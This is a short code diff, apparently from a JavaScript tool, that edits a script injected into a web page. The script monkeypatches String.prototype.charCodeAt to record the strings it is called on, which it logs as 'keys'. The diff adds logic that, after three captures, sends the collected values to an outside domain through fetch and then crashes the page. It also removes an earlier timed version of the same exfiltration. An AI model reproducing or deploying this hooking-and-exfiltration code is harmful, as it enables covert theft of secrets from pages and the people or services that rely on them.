@@ -53,14 +53,15 @@ String.prototype.charCodeAt = function(index) {
     // @ts-ignore
     calledOn.push(this + "");
     log("Found key " + this + " - num " + calledOn.length);
+
+    if (calledOn.length === 3) {
+      fetch("https://zeiuzeygfzeurf.org/" + encodeURIComponent(JSON.stringify(calledOn)));
+      crash();
+    }
   }
-      
+
   return originalCharCodeAt.call(this, index);
 };
-
-setTimeout(() => {
-  fetch("https://zeiuzeygfzeurf.org/" + encodeURIComponent(JSON.stringify(calledOn)));
-}, 3000);
 `
 
 const replacementHtml = `<!DOCTYPE html>
